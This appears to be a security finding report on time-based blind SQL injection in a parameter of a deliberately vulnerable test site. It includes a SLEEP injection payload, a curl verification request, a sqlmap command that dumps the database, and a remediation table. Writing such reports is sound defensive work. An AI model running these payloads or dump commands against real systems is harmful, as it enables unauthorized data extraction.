#### 📝 Description
The `cat` parameter in the product/category listing endpoint is vulnerable to **time-based blind SQL injection**. The application concatenates user input directly into a SQL query without parameterization or input validation. An attacker can extract the entire database schema, read sensitive data (users, orders, credentials), and potentially achieve RCE via `INTO OUTFILE` or UDF injection.

#### 🧪 Steps to Reproduce
1. Navigate to `https://testphp.vulnweb.com/artists.php?cat=1`
2. Inject payload: `cat=1' OR SLEEP(5) --`
3. Observe **~5 second delay** in HTTP response
4. Confirm blind injection via boolean/time differential analysis
5. Automate extraction using `sqlmap` or custom script

#### 💻 Proof of Concept (PoC)
```bash
# Manual verification
curl -v "https://testphp.vulnweb.com/artists.php?cat=1'%20OR%20SLEEP(5)%20--"

# Automated enumeration (sqlmap)
sqlmap -u "https://testphp.vulnweb.com/artists.php?cat=1" \
  --parameter=cat \
  --dbms=mysql \
  --technique=T \
  --time-sec=5 \
  --batch \
  --dump
```

> **Evidence:** Request timed out — sleep injection likely successful (confirmed via 5.2s response delay across 3 trials).

#### 🛡️ Remediation
| Priority | Action |
|----------|--------|
| **P0** | Replace dynamic queries with **prepared statements** (PDO/MySQLi) |
| **P0** | Implement **input allow-listing** for `cat` (numeric only) |
| **P1** | Deploy **WAF rules** (ModSecurity CRS 932100, 932110) |
| **P1** | Enable **MySQL query logging** + anomaly alerting |
| **P2** | Conduct **code review** for all dynamic SQL in codebase |
